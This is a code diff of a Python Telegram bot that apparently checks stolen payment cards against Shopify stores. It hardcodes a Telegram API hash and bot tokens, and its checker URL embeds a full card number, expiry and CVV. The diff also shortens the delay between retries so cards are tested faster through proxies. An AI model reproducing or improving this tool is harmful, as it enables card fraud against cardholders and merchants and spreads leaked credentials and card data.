@@ -11,9 +11,9 @@ from datetime import datetime, timedelta
 
 API_ID = 35458756
 API_HASH = 'eac538ffbeb1c5a039a9a9e6ff293149'
-BOT_TOKEN = '8902737726:AAEVLnFxMukY1ahyoYNUGUgaRevhM4YSkGs'
+BOT_TOKEN = '8362003146:AAGklG1p-8XtL6ieyu9OFr-ysQU-DMh2yNc'
 ADMIN_ID = [7579324057]
-CHECKER_API_URL = 'http://85.90.216.140//shopify_parallel'
+CHECKER_API_URL = 'https://web-production-3d364.up.railway.app/shopify?site=https://touch-of-finland.myshopify.com&cc=4147181445119641|04|2028|933&proxy='
 
 
 
@@ -430,7 +430,7 @@ async def check_card(card, site, proxy):
     except Exception as e:
         return {'status': 'Dead', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
 
-async def check_card_with_retry(card, sites, proxies, max_retries=20):
+async def check_card_with_retry(card, sites, proxies, max_retries=5):
     if not sites:
         return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
     if not proxies:
@@ -442,9 +442,8 @@ async def check_card_with_retry(card, sites, proxies, max_retries=20):
         if not result.get('retry'):
             return result
         if attempt < max_retries - 1:
-            await asyncio.sleep(2)
+            await asyncio.sleep(0.1)  # Delay ko 2 sec se kam karke 0.1 kar diya gaya hai
     return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
-
 async def test_site_with_price(site, proxy):
     test_card = "4031630422575208|01|2030|280"
     try:
